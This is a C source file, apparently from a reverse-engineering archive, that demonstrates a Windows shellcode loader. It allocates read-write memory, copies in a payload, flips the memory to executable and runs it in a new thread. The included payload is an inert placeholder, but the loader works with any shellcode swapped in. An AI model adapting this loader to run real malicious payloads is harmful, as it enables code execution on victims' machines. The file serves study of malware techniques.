/*
    Shellcode Loader
    Archive of Reversing.ID

    Change the memory protection of virtual address space.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAllocEx
    - writing:    RtlMoveMemory
    - permission: VirtualProtectEx
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    HANDLE  h_process;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // get handle to self
    h_process = GetCurrentProcess();

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAllocEx (h_process, 0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtectEx (h_process, runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    VirtualFreeEx (h_process, runtime, payload_len, MEM_RELEASE);

    return 0;
}